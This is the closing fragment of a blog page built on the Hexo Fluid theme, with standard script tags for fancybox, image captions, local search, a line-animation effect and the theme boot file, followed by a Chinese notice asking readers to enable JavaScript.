  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
